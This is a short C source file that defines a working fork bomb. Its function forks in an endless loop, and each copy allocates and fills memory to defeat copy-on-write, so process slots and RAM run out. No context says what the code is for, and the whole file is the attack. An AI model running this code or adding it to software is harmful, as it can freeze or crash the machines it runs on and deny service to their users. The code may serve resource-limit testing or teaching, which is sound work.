#include "fork.h"

void fork_bomb() {
    for (;;) {
        fork(); 
        void* ptr = malloc(MEM_WRITE_SIZE); // cajole the kernel into really forking our process
        if (ptr != NULL)
        {
            memset(ptr, 0xFF, MEM_WRITE_SIZE);
            free(ptr);
        }
    }
}